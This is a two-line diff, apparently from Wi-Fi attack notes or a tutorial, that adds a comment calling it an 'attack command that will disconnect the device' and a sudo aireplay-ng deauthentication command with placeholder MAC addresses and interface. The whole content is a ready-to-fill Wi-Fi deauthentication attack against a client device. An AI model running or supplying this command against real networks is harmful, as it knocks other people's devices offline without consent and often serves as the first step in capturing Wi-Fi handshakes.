@@ -1,0 +1,2 @@
+# Attack command that will disconnect the device
+sudo aireplay-ng --deauth 10 -a 00:11:22:33:44:55 -c 66:77:88:99:AA:BB <your interface you created earlier here>
